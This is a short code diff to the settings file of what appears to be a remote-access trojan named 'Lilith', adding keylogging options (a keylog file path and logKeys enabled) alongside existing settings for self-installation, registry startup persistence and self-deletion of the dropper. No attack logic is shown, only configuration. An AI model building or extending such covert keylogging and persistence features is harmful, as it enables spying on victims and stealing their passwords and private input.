@@ -9,11 +9,13 @@ std::string Settings::folderName = "lilithDEBUG folder";					//name of folder wh
 std::string Settings::startupName = "lilithDEBUG startup";		//startup name in registry / taskmgr
 std::string Settings::logFileName = "log.txt";								//name of log file
 std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
+std::string Settings::keylogPath = "keylog.txt";
 bool Settings::installSelf = false;				//specifies whether the program should install itself
 bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
 bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
 bool Settings::setStartupSelf = false;			//specifies whether the program is to be started on system boot
 bool Settings::logEvents = true;
+bool Settings::logKeys = true;
 
 #else
 
@@ -25,10 +27,12 @@ std::string Settings::folderName = "lilithRELEASE folder";					//name of folder 
 std::string Settings::startupName = "lilithRELEASE startup";		//startup name in registry / taskmgr
 std::string Settings::logFileName = "log.txt";								//name of log file
 std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
+std::string Settings::keylogPath = "keylog.txt";
 bool Settings::installSelf = true;				//specifies whether the program should install itself
 bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
 bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
 bool Settings::setStartupSelf = true;			//specifies whether the program is to be started on system boot
 bool Settings::logEvents = true;
+bool Settings::logKeys = true;
 
 #endif
